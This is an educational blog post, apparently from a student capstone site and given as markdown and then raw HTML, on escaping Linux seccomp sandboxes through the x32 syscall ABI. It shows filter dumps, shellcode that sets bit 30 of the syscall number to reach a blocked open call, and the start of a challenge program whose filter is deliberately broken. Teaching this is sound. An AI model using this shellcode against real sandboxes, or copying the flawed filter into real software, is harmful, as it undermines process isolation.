# Bypass seccomp using x32 ABI
## Intro
The x32 ABI takes advantage of 32 bit pointers and arithmatic to decrease unessasary memory usage, while also having the advantages of the x86_64 ISA. So in theory, it is great to use this to increase performance of programs that have no need for 64 bit data types. Since the x86 ABI syscalls have different numbers that their x32 ABI alternatives, this leaves a security gap if they are not properly blocked by seccomp.

When utilizing seccomp to protect a binary, it is important to block the x32 syscall ABI. This is done by default when using the [libseccomp](https://github.com/seccomp/libseccomp) API. But when editing or manually creating a seccomp filter, it can be easier to leave out or misconfigure.

If you, as an attacker, are able to use the x32 syscall ABI, then you will be able to use syscalls that have their x86_64 version blocked.

The linux kernel can determine if we are using the x32 sycall ABI with the following code in [linux/arch/x86/include/asm/compat.h](https://github.com/torvalds/linux/blob/master/arch/x86/include/asm/compat.h):

```c
static inline bool in_x32_syscall(void)

{

#ifdef CONFIG_X86_X32_ABI

	if (task_pt_regs(current)->orig_ax & __X32_SYSCALL_BIT)

		return true;

#endif

	return false;

}
```

`__X32_SYSCALL_BIT` is defined in [linux/arch/x86/include/uapi/asm/unistd.h](https://github.com/torvalds/linux/blob/5bfc75d92efd494db37f5c4c173d3639d4772966/arch/x86/include/uapi/asm/unistd.h):

```c
#define __X32_SYSCALL_BIT 0x40000000
```

So by setting the 30th bit in our syscall, we can access the x32 ABI.

## Identification
A normal filter would look like (This is the output of [seccomp-tools](https://github.com/david942j/seccomp-tools)):
```shell
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x35 0x10 0x00 0x40000000  if (A >= 0x40000000) goto 0021
 0005: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0007
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 0007: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0009
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 0009: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0011
 0010: 0x06 0x00 0x00 0x00000000  return KILL
 0011: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0013
 0012: 0x06 0x00 0x00 0x00000000  return KILL
 0013: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0015
 0014: 0x06 0x00 0x00 0x00000000  return KILL
 0015: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0017
 0016: 0x06 0x00 0x00 0x00000000  return KILL
 0017: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0019
 0018: 0x06 0x00 0x00 0x00000000  return KILL
 0019: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0021
 0020: 0x06 0x00 0x00 0x00000000  return KILL
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

As you can see on line 0004, sycalls equal to or greater than 0x40000000 (x32 ABI syscalls) are blocked.

Now after omiting the 0004 insturction from above, the x32 ABI is accessable and exploitable.
```shell
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

## Exploitation
As mentioned in the intro, by setting the 30th bit in our syscall, we can access the x32 ABI. For example if we want to use the **open** syscall, instead of setting rax to 0x02, set it to 0x40000002.

So if we were writing shellcode to call `open(0x800000, 0, 0)` it would look like:

```
mov rsi, 0
mov rdx, 0
mov rdi, 0x800000
mov rax, 0x40000002
syscall
```

Now even though in the seccomp filter, the open syscall is blocked, we can still use the x32 syscall ABI to call open.












# HTML

```
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant="" defer=""></script>
  
    <title>X32_ABI SECCOMP Bypass using x32 syscall ABI :: Capstone Project</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Intro When a utilizing SECCOMP to protect a binary, it is important to block the x32 syscall ABI. This is done by default when using the libseccomp API. But when editing or manually creating a SECCOMP filter, it can be easier to leave out or misconfigure.
If you, as an attacker, are able to use the x32 syscall ABI then you will be able to use syscalls that have their x86_64 version blocked.">
<meta name="keywords" content="">
<meta name="robots" content="noodp">
<link rel="canonical" href="/posts/x32_abi-post-1/">




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/pink.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/pink.png">



<meta name="twitter:card" content="summary">



<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="X32_ABI SECCOMP Bypass using x32 syscall ABI">
<meta property="og:description" content="Intro When a utilizing SECCOMP to protect a binary, it is important to block the x32 syscall ABI. This is done by default when using the libseccomp API. But when editing or manually creating a SECCOMP filter, it can be easier to leave out or misconfigure.
If you, as an attacker, are able to use the x32 syscall ABI then you will be able to use syscalls that have their x86_64 version blocked.">
<meta property="og:url" content="/posts/x32_abi-post-1/">
<meta property="og:site_name" content="Capstone Project">

  <meta property="og:image" content="/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-03-30 11:00:59 -0700 PDT">












</head>
<body class="pink">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Capstone Project
  </div>
</a>

    </div>
    
      <div class="menu-trigger hidden">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/x32_abi-post-1/">X32_ABI SECCOMP Bypass using x32 syscall ABI</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-03-30
        
      </span>
    
    
    
  </div>

  
  


  

  <div class="post-content"><div>
        <h2 id="intro">Intro<a href="#intro" class="hanchor" arialabel="Anchor">⌗</a> </h2>
<p>When a utilizing SECCOMP to protect a binary, it is important to block the x32 syscall ABI. This is done by default when using the libseccomp API. But when editing or manually creating a SECCOMP filter, it can be easier to leave out or misconfigure.</p>
<p>If you, as an attacker, are able to use the x32 syscall ABI then you will be able to use syscalls that have their x86_64 version blocked.</p>
<p>The linux kernel can determine if we are using the x32 ABI with the following code in <code>arch/x86/include/asm/compat.h</code>:</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"><span class="token keyword keyword-static">static</span> <span class="token keyword keyword-inline">inline</span> bool <span class="token function">in_x32_syscall</span><span class="token punctuation">(</span><span class="token keyword keyword-void">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_X86_X32_ABI</span></span>

	<span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">task_pt_regs</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token operator">-&gt;</span>orig_ax <span class="token operator">&amp;</span> __X32_SYSCALL_BIT<span class="token punctuation">)</span>

		<span class="token keyword keyword-return">return</span> true<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

	<span class="token keyword keyword-return">return</span> false<span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p><code>__X32_SYSCALL_BIT</code> is defined in <code>arch/x86/include/uapi/asm/unistd.h</code>:</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__X32_SYSCALL_BIT</span> <span class="token expression"><span class="token number">0x40000000</span></span></span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p>So by setting the 30th bit in our syscall, we can access the x32 syscall ABI.</p>
<h2 id="identification">Identification<a href="#identification" class="hanchor" arialabel="Anchor">⌗</a> </h2>
<p>A common, secure SECCOMP filter would look like (This is the output of <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>):</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"> line  CODE  JT   JF      K
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000004</span>  A <span class="token operator">=</span> arch
 <span class="token number">0001</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0xc000003e</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> ARCH_X86_64<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0003</span>
 <span class="token number">0002</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0003</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number
 <span class="token number">0004</span><span class="token operator">:</span> <span class="token number">0x35</span> <span class="token number">0x10</span> <span class="token number">0x00</span> <span class="token number">0x40000000</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">&gt;=</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0021</span>
 <span class="token number">0005</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000002</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> open<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0007</span>
 <span class="token number">0006</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0007</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000038</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> clone<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0009</span>
 <span class="token number">0008</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000039</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> fork<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0011</span>
 <span class="token number">0010</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0011</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x0000003a</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> vfork<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0013</span>
 <span class="token number">0012</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0013</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x0000003b</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> execve<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0015</span>
 <span class="token number">0014</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0015</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000055</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> creat<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0017</span>
 <span class="token number">0016</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0017</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000101</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> openat<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0019</span>
 <span class="token number">0018</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0019</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000142</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> execveat<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0021</span>
 <span class="token number">0020</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0021</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword keyword-return">return</span> ALLOW
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p>Now after omiting the 0004 insturction from above, the x32 ABI is accessable and exploitable.</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"> line  CODE  JT   JF      K
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000004</span>  A <span class="token operator">=</span> arch
 <span class="token number">0001</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0xc000003e</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> ARCH_X86_64<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0003</span>
 <span class="token number">0002</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0003</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number
 <span class="token number">0004</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000002</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> open<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0006</span>
 <span class="token number">0005</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0006</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000038</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> clone<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0008</span>
 <span class="token number">0007</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0008</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000039</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> fork<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0010</span>
 <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0010</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x0000003a</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> vfork<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0012</span>
 <span class="token number">0011</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0012</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x0000003b</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> execve<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0014</span>
 <span class="token number">0013</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0014</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000055</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> creat<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0016</span>
 <span class="token number">0015</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0016</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000101</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> openat<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0018</span>
 <span class="token number">0017</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0018</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x00000142</span>  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> execveat<span class="token punctuation">)</span> <span class="token keyword keyword-goto">goto</span> <span class="token number">0020</span>
 <span class="token number">0019</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword keyword-return">return</span> KILL
 <span class="token number">0020</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword keyword-return">return</span> ALLOW
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" arialabel="Anchor">⌗</a> </h2>
<p>As mentioned in the intro, by setting the 30th bit in our syscall, we can access the x32 syscall ABI. For example if we want to use the <strong>open</strong> syscall, instead of setting rax to 0x02, set it to 0x40000002.</p>
<p>So if we were writing shellcode to call <code>open(0x800000, 0, 0)</code> it would look like:</p>
<pre tabindex="0"><code>mov rsi, 0
mov rdx, 0
mov rdi, 0x800000
mov rax, 0x40000002
syscall
</code></pre><h3 id="challenge">Challenge<a href="#challenge" class="hanchor" arialabel="Anchor">⌗</a> </h3>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/seccomp.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/filter.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ARRAY_SIZE</span><span class="token expression"><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-sizeof">sizeof</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword keyword-sizeof">sizeof</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword keyword-int">int</span> <span class="token function">filter_syscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword keyword-int">int</span> ret <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-struct">struct</span> <span class="token class-name">sock_filter</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment">/* op,   jt,   jf,     k    */</span>
    <span class="token punctuation">{</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000004</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">// Verify x86_64 Arch</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0xc000003e</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x40000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">// Determine if using x86 syscall ABI | Bug: Jumps to ALLOW (relative jumps are hard).</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000002</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x0000003b</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000027</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7fff0000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-struct">struct</span> <span class="token class-name">sock_fprog</span> bpf <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token function">ARRAY_SIZE</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">.</span>filter <span class="token operator">=</span> code<span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NO_NEW_PRIVS<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_SECCOMP<span class="token punctuation">,</span> SECCOMP_MODE_FILTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bpf<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-void">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-void">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword keyword-char">char</span> shellcode<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* initialize the libseccomp context */</span>
